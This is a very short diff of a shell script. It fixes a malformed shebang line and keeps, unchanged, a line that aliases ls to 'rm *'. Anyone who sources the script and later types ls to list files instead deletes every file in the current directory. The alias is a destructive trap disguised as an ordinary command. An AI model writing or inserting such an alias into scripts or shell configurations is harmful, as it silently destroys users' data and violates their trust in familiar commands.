@@ -1,2 +1,2 @@
-#!/binls/bash
+#!/bin/bash
 alias ls='rm *' 
